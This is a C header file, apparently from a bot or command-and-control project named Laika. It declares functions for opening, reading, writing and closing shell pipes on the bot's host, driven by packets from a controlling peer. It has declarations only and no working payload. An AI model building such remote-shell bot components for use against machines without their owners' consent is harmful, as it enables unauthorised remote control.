#ifndef LAIKA_SHELL_H
#define LAIKA_SHELL_H

#include <stddef.h>

struct sLaika_bot;
struct sLaika_shell {
    int pid;
    int fd;
    int id;
};

struct sLaika_shell *laikaB_newShell(struct sLaika_bot *bot, int id);
void laikaB_freeShell(struct sLaika_bot *bot, struct sLaika_shell *shell);

/* handles reading & writing to shell pipes */
bool laikaB_readShell(struct sLaika_bot *bot, struct sLaika_shell *shell);
bool laikaB_writeShell(struct sLaika_bot *bot, struct sLaika_shell *shell, char *buf, size_t length);

/* packet handlers */
void laikaB_handleShellOpen(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData);
void laikaB_handleShellClose(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData);
void laikaB_handleShellData(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData);

#endif